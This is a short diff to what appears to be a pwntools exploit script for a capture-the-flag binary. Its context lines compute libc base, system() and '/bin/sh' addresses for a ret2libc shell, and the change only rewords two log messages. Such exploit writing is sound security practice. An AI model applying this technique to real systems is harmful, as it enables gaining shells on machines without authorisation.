@@ -38,8 +38,8 @@ libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
 libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
 system_addr = libc_base + libc.dump('system')
 binsh_addr = libc_base + libc.dump('str_bin_sh')
-log.success('get system addr: ' + hex(system_addr))
-log.success('get binsh addr: ' + hex(binsh_addr))
+log.success('System_Addr:\t' + hex(system_addr))
+log.success('Binsh_Addr:\t' + hex(binsh_addr))
 #gdb.attach(sh)
 
 # get heap addr and ebp addr
